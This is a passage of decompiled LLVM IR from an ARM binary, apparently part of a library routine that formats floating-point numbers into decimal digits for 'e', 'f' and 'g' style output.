  br i1 %v7_14328, label %dec_label_pc_1433c, label %bb226

bb226:                                            ; preds = %dec_label_pc_1430c
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_143f0

dec_label_pc_1433c:                               ; preds = %dec_label_pc_1430c
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_1434c = fcmp ogt double %arg2, 0.000000e+00
  %v7_1434c = fcmp oeq double %arg2, 0.000000e+00
  %v8_1434c = select i1 %v6_1434c, i32 1, i32 -1
  %v9_1434c = select i1 %v7_1434c, i32 0, i32 %v8_1434c
  store i32 %v9_1434c, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14350 = icmp slt i32 %v9_1434c, 0
  store i1 %v1_14350, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1434c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1434c, label %dec_label_pc_14358, label %bb227

dec_label_pc_14358:                               ; preds = %dec_label_pc_1433c
  %v10_14368 = fdiv double 0x3FF000003FD00000, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_14374 = fcmp ogt double %v10_14368, 0.000000e+00
  %v7_14374 = zext i1 %v6_14374 to i32
  store i32 %v7_14374, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14378 = icmp eq i1 %v6_14374, false
  store i1 %v2_14378, i1* %cpsr_z.global-to-local, align 1
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14560

bb227:                                            ; preds = %dec_label_pc_1433c
  %v10_143d0 = fmul double %arg2, 0x3FD000000001AE58
  %v11_143d0 = fptrunc double %v10_143d0 to float
  %v12_143d0 = bitcast float %v11_143d0 to i32
  store i32 %v12_143d0, i32* %r2.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v6_143e4 = fcmp olt double %v10_143d0, %arg2
  %v7_143e4 = fcmp oeq double %v10_143d0, %arg2
  %v8_143e4 = select i1 %v6_143e4, i32 1, i32 -1
  %v9_143e4 = select i1 %v7_143e4, i32 0, i32 %v8_143e4
  store i32 %v9_143e4, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_143e8 = icmp slt i32 %v9_143e4, 0
  store i1 %v1_143e8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_143e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_143e4, label %dec_label_pc_143f0, label %dec_label_pc_14434

dec_label_pc_143f0:                               ; preds = %bb226, %bb227
  %v0_14320.v1_143348 = phi i32 [ 0, %bb227 ], [ 8, %bb226 ]
  store i32 %arg4, i32* %ip.global-to-local, align 4
  %v2_143f8 = add i32 %arg4, 16
  %v3_143f8 = inttoptr i32 %v2_143f8 to i32*
  store i32 32, i32* %v3_143f8, align 4
  %v0_14400 = load i32, i32* %sl.global-to-local, align 4
  %v1_14400 = add i32 %v0_14400, -96
  %v3_14400 = sub i32 95, %v0_14400
  %v4_14400 = and i32 %v3_14400, %v0_14400
  %v5_14400 = icmp slt i32 %v4_14400, 0
  store i1 %v5_14400, i1* %cpsr_v.global-to-local, align 1
  %v6_14400 = icmp slt i32 %v1_14400, 0
  store i1 %v6_14400, i1* %cpsr_n.global-to-local, align 1
  %v7_14400 = icmp eq i32 %v0_14400, 96
  store i1 %v7_14400, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-160, align 4
  %tmp286 = icmp ult i32 %v0_14400, 97
  br i1 %tmp286, label %bb228, label %.thread127

bb228:                                            ; preds = %dec_label_pc_143f0
  %v5_14414 = or i32 %v0_14320.v1_143348, 4
  store i32 %v5_14414, i32* %r3.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_143f0, %bb228
  %v4_14418 = phi i32 [ %v5_14414, %bb228 ], [ 3, %dec_label_pc_143f0 ]
  %v4_14418.v0_14320.v1_14334 = select i1 %tmp286, i32 %v4_14418, i32 %v0_14320.v1_143348
  store i32 ptrtoint ([4 x i8]* @global_var_1ae58.566 to i32), i32* %r2.global-to-local, align 4
  %v2_14424 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14424, i32* %r6.global-to-local, align 4
  %v2_14428 = add i32 %v4_14418.v0_14320.v1_14334, ptrtoint ([4 x i8]* @global_var_1ae58.566 to i32)
  store i32 %v2_14428, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1496c

dec_label_pc_14434:                               ; preds = %bb227
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14504

dec_label_pc_14504:                               ; preds = %dec_label_pc_14504, %dec_label_pc_14434
  %v0_1450c = phi i32 [ 256, %dec_label_pc_14434 ], [ %v3_1450c, %dec_label_pc_14504 ]
  %v0_144c8 = phi i32 [ %tmp183, %dec_label_pc_14434 ], [ %v11_144d0, %dec_label_pc_14504 ]
  %stack_var_-192.2 = phi i32 [ 8, %dec_label_pc_14434 ], [ %v2_144f4, %dec_label_pc_14504 ]
  %stack_var_-180.0 = phi i32 [ 9, %dec_label_pc_14434 ], [ %v1_14468, %dec_label_pc_14504 ]
  %v1_14468 = add nsw i32 %stack_var_-180.0, -1
  store i32 ptrtoint (i32* @global_var_1ae6c.569 to i32), i32* %r2.global-to-local, align 4
  %v3_1447c = mul i32 %v1_14468, 8
  store i32 %v3_1447c, i32* %r3.global-to-local, align 4
  store i32 %v0_144c8, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v2_14488 = add i32 %v3_1447c, ptrtoint (i32* @global_var_1ae6c.569 to i32)
  store i32 %v2_14488, i32* %ip.global-to-local, align 4
  %v1_14490 = inttoptr i32 %v2_14488 to i32*
  %v2_14490 = load i32, i32* %v1_14490, align 4
  %v3_14490 = sext i32 %v2_14490 to i64
  %v1_144c8 = sext i32 %v0_144c8 to i64
  %v2_144c8 = bitcast i64 %v1_144c8 to double
  %v8_144d0 = bitcast i64 %v3_14490 to double
  %v9_144d0 = fdiv double %v2_144c8, %v8_144d0
  %v10_144d0 = fptrunc double %v9_144d0 to float
  %v11_144d0 = bitcast float %v10_144d0 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v11_144d0, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  %v6_144e4 = fcmp ogt double %v9_144d0, 0x4CBEBC20
  %v7_144e4 = zext i1 %v6_144e4 to i32
  store i32 %v7_144e4, i32* %r0.global-to-local, align 4
  %v2_144f4 = add i32 %stack_var_-192.2, %v0_1450c
  store i32 %v2_144f4, i32* %r1.global-to-local, align 4
  store i32 %v11_144d0, i32* %r4.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %v1_14468, i32* %r2.global-to-local, align 4
  %v2_14508 = icmp eq i32 %v1_14468, 0
  %v3_1450c = sdiv i32 %v0_1450c, 2
  br i1 %v2_14508, label %dec_label_pc_14514, label %dec_label_pc_14504

dec_label_pc_14514:                               ; preds = %dec_label_pc_14504
  %v6_14524 = fcmp ogt double %v9_144d0, 0x4E6E6B2A
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14528 = icmp eq i1 %v6_14524, false
  store i1 %v2_14528, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 1092616194, i32* %r2.global-to-local, align 4
  %v10_14548 = fdiv double %v9_144d0, 0x4024000041F00000
  %v11_14548 = fptrunc double %v10_14548 to float
  %v12_14548 = bitcast float %v11_14548 to i32
  store i32 %v12_14548, i32* %r0.global-to-local, align 4
  store i32 520, i32* %r3.global-to-local, align 4
  store i32 %v12_14548, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14560

dec_label_pc_14560:                               ; preds = %dec_label_pc_14358, %dec_label_pc_14514
  %v0_1456c73 = phi i32 [ %tmp183, %dec_label_pc_14358 ], [ %v12_14548, %dec_label_pc_14514 ]
  %stack_var_-192.6 = phi i32 [ -1, %dec_label_pc_14358 ], [ 520, %dec_label_pc_14514 ]
  %v2_14560 = ptrtoint i32* %stack_var_-77 to i32
  store i32 %v2_14560, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14568

dec_label_pc_14568:                               ; preds = %dec_label_pc_145fc.dec_label_pc_14568_crit_edge, %dec_label_pc_14560
  %v0_145a0 = phi i32 [ %v0_1456c.pre, %dec_label_pc_145fc.dec_label_pc_14568_crit_edge ], [ %v0_1456c73, %dec_label_pc_14560 ]
  %v0_145a4 = phi i32 [ %v0_14568.pre, %dec_label_pc_145fc.dec_label_pc_14568_crit_edge ], [ %arg3, %dec_label_pc_14560 ]
  store i32 %v0_145a4, i32* %r1.global-to-local, align 4
  %v1_14570 = sext i32 %v0_145a0 to i64
  %v2_14570 = bitcast i64 %v1_14570 to double
  %v3_14570 = fptoui double %v2_14570 to i32
  store i32 %v3_14570, i32* %r4.global-to-local, align 4
  store i32 %v3_14570, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1457c = icmp slt i32 %v3_14570, 0
  store i1 %v1_1457c, i1* %cpsr_n.global-to-local, align 1
  %v2_1457c = icmp eq i32 %v3_14570, 0
  store i1 %v2_1457c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_145a4, i32* %r3.global-to-local, align 4
  br i1 %v1_1457c, label %dec_label_pc_1458c, label %dec_label_pc_145a0

dec_label_pc_1458c:                               ; preds = %dec_label_pc_14568
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001AE5B) to float) to i32), i32* %r0.global-to-local, align 4
  store i32 bitcast (float fptrunc (double fadd (double undef, double 0x41F000000001AE5B) to float) to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_145a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145a0

dec_label_pc_145a0:                               ; preds = %dec_label_pc_14568, %dec_label_pc_1458c
  store i32 %v0_145a0, i32* @r0, align 4
  store i32 %v0_145a4, i32* %r1.global-to-local, align 4
  %v1_145a8 = fptrunc double %v2_14570 to float
  %v2_145a8 = bitcast float %v1_145a8 to i32
  %v4_145a8 = call i32 @__aeabi_dsub(i32 %v2_145a8, i32 %v0_145a4)
  %v5_145a8 = sext i32 %v4_145a8 to i64
  store i32 1315859242, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_145b4 = bitcast i64 %v5_145a8 to double
  %v9_145b4 = fmul double %v3_145b4, 0x41CDCD6540240000
  %v10_145b4 = fptrunc double %v9_145b4 to float
  %v11_145b4 = bitcast float %v10_145b4 to i32
  store i32 %v11_145b4, i32* %r0.global-to-local, align 4
  %v0_145b8 = load i32, i32* %sb.global-to-local, align 4
  %v1_145b8 = add i32 %v0_145b8, 9
  store i32 %v1_145b8, i32* %sb.global-to-local, align 4
  store i32 %v11_145b4, i32* %r6.global-to-local, align 4
  store i32 %v0_145a4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_145c8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145c8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_145c8.dec_label_pc_145c8_crit_edge, %dec_label_pc_145a0
  %v1_145dc = phi i32 [ %v1_145dc.pre, %dec_label_pc_145c8.dec_label_pc_145c8_crit_edge ], [ %v1_145b8, %dec_label_pc_145a0 ]
  %v0_145d4 = phi i32 [ %v0_145f0, %dec_label_pc_145c8.dec_label_pc_145c8_crit_edge ], [ 0, %dec_label_pc_145a0 ]
  %v0_145e0 = phi i32 [ %v2_145ec, %dec_label_pc_145c8.dec_label_pc_145c8_crit_edge ], [ %v0_145c8.pre, %dec_label_pc_145a0 ]
  %v2_145d0 = urem i32 %v0_145e0, 10
  %v1_145d4 = add i32 %v0_145d4, 1
  store i32 %v1_145d4, i32* %r5.global-to-local, align 4
  %v1_145d8 = or i32 %v2_145d0, 48
  store i32 %v1_145d8, i32* %r2.global-to-local, align 4
  %v2_145dc = sub i32 %v1_145dc, %v1_145d4
  store i32 %v2_145dc, i32* %r3.global-to-local, align 4
  store i32 %v0_145e0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_145e8 = trunc i32 %v1_145d8 to i8
  %v3_145e8 = inttoptr i32 %v2_145dc to i8*
  store i8 %v1_145e8, i8* %v3_145e8, align 1
  %v0_145ec = load i32, i32* %r0.global-to-local, align 4
  %v1_145ec = load i32, i32* %r1.global-to-local, align 4
  %v2_145ec = udiv i32 %v0_145ec, %v1_145ec
  store i32 %v2_145ec, i32* %r0.global-to-local, align 4
  %v0_145f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_145f0 = add i32 %v0_145f0, -8
  %v3_145f0 = sub i32 7, %v0_145f0
  %v4_145f0 = and i32 %v3_145f0, %v0_145f0
  %v5_145f0 = icmp slt i32 %v4_145f0, 0
  store i1 %v5_145f0, i1* %cpsr_v.global-to-local, align 1
  %v6_145f0 = icmp slt i32 %v1_145f0, 0
  store i1 %v6_145f0, i1* %cpsr_n.global-to-local, align 1
  %v7_145f0 = icmp eq i32 %v0_145f0, 8
  store i1 %v7_145f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_145ec, i32* %r4.global-to-local, align 4
  %v7_145f8 = icmp slt i32 %v0_145f0, 9
  br i1 %v7_145f8, label %dec_label_pc_145c8.dec_label_pc_145c8_crit_edge, label %dec_label_pc_145fc

dec_label_pc_145c8.dec_label_pc_145c8_crit_edge:  ; preds = %dec_label_pc_145c8
  %v1_145dc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_145c8

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145c8
  %v0_145fc = load i32, i32* %r8.global-to-local, align 4
  %v1_145fc = add i32 %v0_145fc, 1
  store i32 %v1_145fc, i32* %r8.global-to-local, align 4
  %v3_14600 = sub i32 -1, %v0_145fc
  %v4_14600 = and i32 %v1_145fc, %v3_14600
  %v5_14600 = icmp slt i32 %v4_14600, 0
  store i1 %v5_14600, i1* %cpsr_v.global-to-local, align 1
  %v6_14600 = icmp slt i32 %v0_145fc, 0
  store i1 %v6_14600, i1* %cpsr_n.global-to-local, align 1
  %v7_14600 = icmp eq i32 %v0_145fc, 0
  store i1 %v7_14600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14600, label %dec_label_pc_145fc.dec_label_pc_14568_crit_edge, label %dec_label_pc_14608

dec_label_pc_145fc.dec_label_pc_14568_crit_edge:  ; preds = %dec_label_pc_145fc
  %v0_14568.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1456c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14568

dec_label_pc_14608:                               ; preds = %dec_label_pc_145fc
  %v0_14608 = load i32, i32* %sl.global-to-local, align 4
  %v1_14608 = add i32 %v0_14608, -96
  %v3_14608 = sub i32 95, %v0_14608
  %v4_14608 = and i32 %v3_14608, %v0_14608
  %v5_14608 = icmp slt i32 %v4_14608, 0
  store i1 %v5_14608, i1* %cpsr_v.global-to-local, align 1
  %v6_14608 = icmp slt i32 %v1_14608, 0
  store i1 %v6_14608, i1* %cpsr_n.global-to-local, align 1
  %v7_14608 = icmp eq i32 %v0_14608, 96
  store i1 %v7_14608, i1* %cpsr_z.global-to-local, align 1
  %tmp287 = icmp ult i32 %v0_14608, 97
  store i32 %v1_14638, i32* %ip.global-to-local, align 4
  br i1 %tmp287, label %bb229, label %thread-pre-split

bb229:                                            ; preds = %dec_label_pc_14608
  %v5_14618 = add i32 %v0_14608, 32
  store i32 %v5_14618, i32* %r3.global-to-local, align 4
  %v5_1461c = urem i32 %v5_14618, 256
  store i32 %v5_1461c, i32* %sl.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14608, %bb229
  %v0_14640 = phi i32 [ %v5_1461c, %bb229 ], [ %v0_14608, %dec_label_pc_14608 ]
  %stack_var_-58.0131138 = phi i32 [ 69, %bb229 ], [ 101, %dec_label_pc_14608 ]
  %v7_14620 = icmp eq i32 %v0_14640, 103
  %. = zext i1 %v7_14620 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1462c = icmp slt i32 %v1_14638, 0
  store i1 %v1_1462c, i1* %cpsr_n.global-to-local, align 1
  %v2_1462c = icmp eq i32 %v1_14638, 0
  store i1 %v2_1462c, i1* %cpsr_z.global-to-local, align 1
  %tmp232 = icmp slt i32 %v1_14638, 1
  br i1 %tmp232, label %.thread12, label %bb233

.thread12:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb235

bb233:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14634 = icmp eq i1 %v7_14620, false
  store i1 %v2_14634, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14634, label %bb235, label %bb234

bb234:                                            ; preds = %bb233
  %v2_14638 = add i32 %v1_14638, -1
  store i32 %v2_14638, i32* %ip.global-to-local, align 4
  br label %bb235

bb235:                                            ; preds = %.thread12, %bb233, %bb234
  %v0_1463c = phi i32 [ %v1_14638, %.thread12 ], [ %v1_14638, %bb233 ], [ %v2_14638, %bb234 ]
  %v1_14640 = add i32 %v0_14640, -102
  %v3_14640 = sub i32 101, %v0_14640
  %v4_14640 = and i32 %v3_14640, %v0_14640
  %v5_14640 = icmp slt i32 %v4_14640, 0
  store i1 %v5_14640, i1* %cpsr_v.global-to-local, align 1
  %v6_14640 = icmp slt i32 %v1_14640, 0
  store i1 %v6_14640, i1* %cpsr_n.global-to-local, align 1
  %v7_14640 = icmp eq i32 %v0_14640, 102
  store i1 %v7_14640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14640, label %dec_label_pc_1464c, label %bb236

bb236:                                            ; preds = %bb235
  store i32 %v0_1463c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14678

dec_label_pc_1464c:                               ; preds = %bb235
  store i32 %v0_1463c, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-192.6, i32* %r1.global-to-local, align 4
  %v2_14654 = add i32 %v0_1463c, %stack_var_-192.6
  store i32 %v2_14654, i32* %ip.global-to-local, align 4
  %v1_14658 = add i32 %v2_14654, 1
  %v3_14658 = sub i32 0, %v2_14654
  %v4_14658 = and i32 %v1_14658, %v3_14658
  %v5_14658 = icmp slt i32 %v4_14658, 0
  store i1 %v5_14658, i1* %cpsr_v.global-to-local, align 1
  %v6_14658 = icmp slt i32 %v1_14658, 0
  store i1 %v6_14658, i1* %cpsr_n.global-to-local, align 1
  %v7_14658 = icmp eq i32 %v1_14658, 0
  store i1 %v7_14658, i1* %cpsr_z.global-to-local, align 1
  %v2_1465c = xor i1 %v6_14658, %v5_14658
  br i1 %v2_1465c, label %dec_label_pc_14660, label %dec_label_pc_14678

dec_label_pc_14660:                               ; preds = %dec_label_pc_1464c
  %v2_14660 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_14660, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_1466c = bitcast i32* %stack_var_-79 to i8*
  %v3_1466c = call i32 @__GI_memset(i8* %v2_1466c, i32 48)
  store i32 %v3_1466c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14678

dec_label_pc_14678:                               ; preds = %bb236, %dec_label_pc_1464c, %dec_label_pc_14660
  %v1_146bc88 = phi i32 [ %v3_1466c, %dec_label_pc_14660 ], [ %v0_1463c, %dec_label_pc_1464c ], [ %v2_145ec, %bb236 ]
  %v1_146a0 = phi i32 [ -1, %dec_label_pc_14660 ], [ %v2_14654, %dec_label_pc_1464c ], [ %v0_1463c, %bb236 ]
  %stack_var_-192.7 = phi i32 [ -1, %dec_label_pc_14660 ], [ %stack_var_-192.6, %dec_label_pc_1464c ], [ %stack_var_-192.6, %bb236 ]
  %v1_1467c = add i32 %v1_146a0, -16
  %v3_1467c = sub i32 15, %v1_146a0
  %v4_1467c = and i32 %v3_1467c, %v1_146a0
  %v5_1467c = icmp slt i32 %v4_1467c, 0
  store i1 %v5_1467c, i1* %cpsr_v.global-to-local, align 1
  %v6_1467c = icmp slt i32 %v1_1467c, 0
  store i1 %v6_1467c, i1* %cpsr_n.global-to-local, align 1
  %v7_1467c = icmp eq i32 %v1_146a0, 16
  store i1 %v7_1467c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-78, align 4
  %v2_14688 = ptrtoint i32* %stack_var_-79 to i32
  store i32 %v2_14688, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-79, align 4
  %v3_14690 = xor i1 %v6_1467c, %v5_1467c
  %v4_14690 = or i1 %v7_1467c, %v3_14690
  br i1 %v4_14690, label %dec_label_pc_1469c, label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %dec_label_pc_14678
  store i32 0, i32* %r0.global-to-local, align 4
  %v7_14694152 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v7_14694152, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14678
  %v2_1469c = ptrtoint i32* %stack_var_-78 to i32
  %v2_146a0 = add i32 %v1_146a0, %v2_1469c
  store i32 %v2_146a0, i32* %r3.global-to-local, align 4
  %v1_146a4 = add i32 %v2_146a0, 2
  %v2_146a4 = inttoptr i32 %v1_146a4 to i8*
  %v3_146a4 = load i8, i8* %v2_146a4, align 1
  %v4_146a4 = zext i8 %v3_146a4 to i32
  store i32 %v4_146a4, i32* %r2.global-to-local, align 4
  store i32 %v1_146a4, i32* %r1.global-to-local, align 4
  %v2_146ac = icmp ugt i8 %v3_146a4, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_146ac = icmp ult i8 %v3_146a4, 52
  store i1 %v6_146ac, i1* %cpsr_n.global-to-local, align 1
  %v7_146ac = icmp eq i8 %v3_146a4, 52
  store i1 %v7_146ac, i1* %cpsr_z.global-to-local, align 1
  %v2_146b0 = xor i1 %v2_146ac, true
  %v3_146b0 = or i1 %v7_146ac, %v2_146b0
  br i1 %v3_146b0, label %bb237, label %bb238

bb237:                                            ; preds = %dec_label_pc_1469c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb238

bb238:                                            ; preds = %dec_label_pc_1469c, %bb237
  %v1_146bc86 = phi i32 [ %v1_146bc88, %dec_label_pc_1469c ], [ 0, %bb237 ]
  %v2_146b4 = xor i1 %v7_146ac, true
  %v3_146b4 = and i1 %v2_146ac, %v2_146b4
  br i1 %v3_146b4, label %bb239, label %.preheader

bb239:                                            ; preds = %bb238
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb238, %bb239, %..preheader_crit_edge, %.backedge
  %v1_146bc = phi i32 [ %v1_146bc.pre, %.backedge ], [ 0, %..preheader_crit_edge ], [ %v1_146bc86, %bb238 ], [ 1, %bb239 ]
  %v0_146b8 = phi i32 [ %v0_146c4, %.backedge ], [ %v7_14694152, %..preheader_crit_edge ], [ %v1_146a4, %bb238 ], [ %v1_146a4, %bb239 ]
  %v1_146b8 = add i32 %v0_146b8, -1
  %v2_146b8 = inttoptr i32 %v1_146b8 to i8*
  %v3_146b8 = load i8, i8* %v2_146b8, align 1
  %v4_146b8 = zext i8 %v3_146b8 to i32
  store i32 %v1_146b8, i32* %r1.global-to-local, align 4
  %v2_146bc = add i32 %v4_146b8, %v1_146bc
  store i32 %v2_146bc, i32* %r3.global-to-local, align 4
  %v1_146c0 = trunc i32 %v2_146bc to i8
  store i8 %v1_146c0, i8* %v2_146b8, align 1
  %v0_146c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_146c4 = inttoptr i32 %v0_146c4 to i8*
  %v2_146c4 = load i8, i8* %v1_146c4, align 1
  %v3_146c4 = zext i8 %v2_146c4 to i32
  store i32 %v3_146c4, i32* %r2.global-to-local, align 4
  %v2_146c8 = icmp ugt i8 %v2_146c4, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_146c8 = icmp ult i8 %v2_146c4, 57
  store i1 %v6_146c8, i1* %cpsr_n.global-to-local, align 1
  %v7_146c8 = icmp eq i8 %v2_146c4, 57
  store i1 %v7_146c8, i1* %cpsr_z.global-to-local, align 1
  %v2_146cc = xor i1 %v2_146c8, true
  %v3_146cc = or i1 %v7_146c8, %v2_146cc
  br i1 %v3_146cc, label %bb240, label %bb241

bb240:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %.preheader, %bb240
  %v2_146d0 = xor i1 %v7_146c8, true
  %v3_146d0 = and i1 %v2_146c8, %v2_146d0
  br i1 %v3_146d0, label %bb242, label %._crit_edge

._crit_edge:                                      ; preds = %bb241
  %v1_146d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb243

bb242:                                            ; preds = %bb241
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb243

bb243:                                            ; preds = %._crit_edge, %bb242
  %v1_146d8 = phi i32 [ %v1_146d8.pre, %._crit_edge ], [ 1, %bb242 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_146d4 = icmp ult i8 %v2_146c4, 48
  store i1 %v6_146d4, i1* %cpsr_n.global-to-local, align 1
  %v7_146d4 = icmp eq i8 %v2_146c4, 48
  store i1 %v7_146d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_146d4, label %.thread17, label %bb244

.thread17:                                        ; preds = %bb243
  %v2_146d8 = or i32 %v1_146d8, 1
  store i32 %v2_146d8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_146dc18 = icmp slt i32 %v2_146d8, 0
  store i1 %v1_146dc18, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb244:                                            ; preds = %bb243
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_146dc = icmp slt i32 %v1_146d8, 0
  store i1 %v1_146dc, i1* %cpsr_n.global-to-local, align 1
  %v2_146dc = icmp eq i32 %v1_146d8, 0
  store i1 %v2_146dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146dc, label %dec_label_pc_146e4, label %.backedge

.backedge:                                        ; preds = %bb244, %.thread17
  %v1_146bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_146e4:                               ; preds = %bb244
  store i32 %v2_14688, i32* %r2.global-to-local, align 4
  %v2_146e8 = ptrtoint i32* %stack_var_-78 to i32
  store i32 %v2_146e8, i32* %r3.global-to-local, align 4
  %v2_146ec = sub i32 %v0_146c4, %v2_146e8
  %v3_146ec = icmp uge i32 %v0_146c4, %v2_146e8
  %v4_146ec = xor i32 %v0_146c4, %v2_146e8
  %v5_146ec = xor i32 %v2_146ec, %v0_146c4
  %v6_146ec = and i32 %v5_146ec, %v4_146ec
  %v7_146ec = icmp slt i32 %v6_146ec, 0
  store i1 %v7_146ec, i1* %cpsr_v.global-to-local, align 1
  %v8_146ec = icmp slt i32 %v2_146ec, 0
  store i1 %v8_146ec, i1* %cpsr_n.global-to-local, align 1
  %v9_146ec = icmp eq i32 %v0_146c4, %v2_146e8
  store i1 %v9_146ec, i1* %cpsr_z.global-to-local, align 1
  %v2_146f0 = xor i1 %v3_146ec, true
  %v3_146f0 = or i1 %v9_146ec, %v2_146f0
  br i1 %v3_146f0, label %bb245, label %.thread162

bb245:                                            ; preds = %dec_label_pc_146e4
  store i32 %v2_146e8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-192.7, i32* %r3.global-to-local, align 4
  store i32 %v2_146e8, i32* %r1.global-to-local, align 4
  br label %.thread162

.thread162:                                       ; preds = %dec_label_pc_146e4, %bb245
  %v4_14700160 = phi i32 [ %stack_var_-192.7, %bb245 ], [ %v2_146e8, %dec_label_pc_146e4 ]
  %v2_14710 = phi i32 [ %v2_146e8, %bb245 ], [ %v0_146c4, %dec_label_pc_146e4 ]
  %v4_14704154159 = phi i32 [ %v2_146e8, %bb245 ], [ %v2_14688, %dec_label_pc_146e4 ]
  %v2_146fc = xor i1 %v9_146ec, true
  %v3_146fc = and i1 %v3_146ec, %v2_146fc
  br i1 %v3_146fc, label %bb246, label %bb247

bb246:                                            ; preds = %.thread162
  store i32 %stack_var_-192.7, i32* %r0.global-to-local, align 4
  br label %bb247

bb247:                                            ; preds = %.thread162, %bb246
  br i1 %v3_146f0, label %bb248, label %bb249

bb248:                                            ; preds = %bb247
  %v5_14700 = add i32 %v4_14700160, 1
  store i32 %v5_14700, i32* %r0.global-to-local, align 4
  br label %bb249

